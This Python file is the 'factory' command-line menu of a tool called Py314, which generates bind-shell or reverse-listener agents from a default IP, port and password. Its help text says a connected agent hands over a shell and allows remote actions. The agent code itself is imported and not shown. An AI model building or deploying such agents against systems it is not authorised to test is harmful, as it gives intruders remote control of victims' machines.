import os
import logging
from cmd import Cmd
from termcolor import colored
from generaters import bind_agent
from prettytable import PrettyTable

class Prompt(Cmd):
    """Simple Py314 agent factory"""

    availableTypes = ['bind_agent', 'reverse_listener']
    homeFolder = os.environ['HOME']
    py314Folder = f"{homeFolder}/.Py314"

    optionsDict = {
        'type': 'bind_agent',
        'address': '10.0.10.110',
        'port': 1234,
        'password': 'Py314!',
        'outfile': f"{py314Folder}/agent.py"
    }


# < -------------------------- OVERRIDE -------------------------- >

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.

        """
# < -------------------------- COMMANDS -------------------------- >

    def do_bg(self, arg):
        """Return to Py314 main interpreter"""
        return True

    def do_exit(self, arg):
        """Quit Py314"""
        exit()

    def do_generate(self, arg):
        """Generate agent with given options"""

        generation = True

        for key, value in self.optionsDict.items():
            if value == '':
                generation = False
                logger.warning(f"The option {key} can't be empty")

        if generation is True:

            if self.optionsDict['type'] == 'bind_agent':
                bind_agent.writeAgent(
                    self.optionsDict['outfile'],
                    self.optionsDict['address'],
                    self.optionsDict['port'],
                    self.optionsDict['password']
                )
                

    def do_options(self, arg):
        """Show currents settings of handler"""

        print("""\nThe bind_agent handler is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed\n""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in dir(self):
            if option.startswith('set_'):
                optionName = option.replace('set_', '')
                optionValue = self.optionsDict[optionName]
                optionDoc = getattr(self, option).__doc__

                table.add_row([optionName, optionValue, optionDoc])

        print(table)

    def do_set(self, arg):
        """Set value for available option : set <option> <value>"""

        if len(arg.split(' ')) > 2 or len(arg.split(' ')) < 2:
            logger.warning(f"Please specify set <option> <value>")
        
        else:

            availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
            option = arg.split(' ')[0]
            value = arg.split(' ')[1]

            if option not in availableOptions:
                logger.warning(f"[!] Option {option} can't be set")

            elif option == 'type' and value not in self.availableTypes:
                logger.warning(f"Specify a valid type of agent : ")
                for agent in self.availableTypes:
                    print(f" - {agent}")
            else:
                logger.debug(f'Option [{option}] set to [{value}]')
                self.optionsDict[option] = value



    def do_unset(self, arg):
        """Unset value for available option : unset <option>"""

        if len(arg.split(' ')) > 1 or len(arg.split(' ')) < 1:
            logger.warning(f"Please specify unset <option>")
        
        else:

            availableOptions = [options.replace('set_', '') for options in dir(self) if options.startswith('set_')]
            option = arg.split(' ')[0]

            if option not in availableOptions:
                logger.warning(f"Option {option} can't be unset")
            else:
                self.optionsDict[option] = ''




# < -------------------------- factory OPTIONS -------------------------- >

    def set_type(self):
        """Define the type of agent : bind_agent/reverse_listener"""

    def set_address(self):
        """Define the IP address to bind/listen"""

    def set_outfile(self):
        """Define the output file which contain agent script"""

    def set_port(self):
        """Define the port of Py314 agent to bind/listen"""

    def set_password(self):
        """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""





def startFactory():

    

    subPrompt = Prompt()
    subPrompt.prompt = f"({colored('factory', 'magenta')}) > "
    subPrompt.cmdloop()


# --------------------------------------------------------------------
# --------------------------- Main -----------------------------------
# --------------------------------------------------------------------

logger = logging.getLogger('main')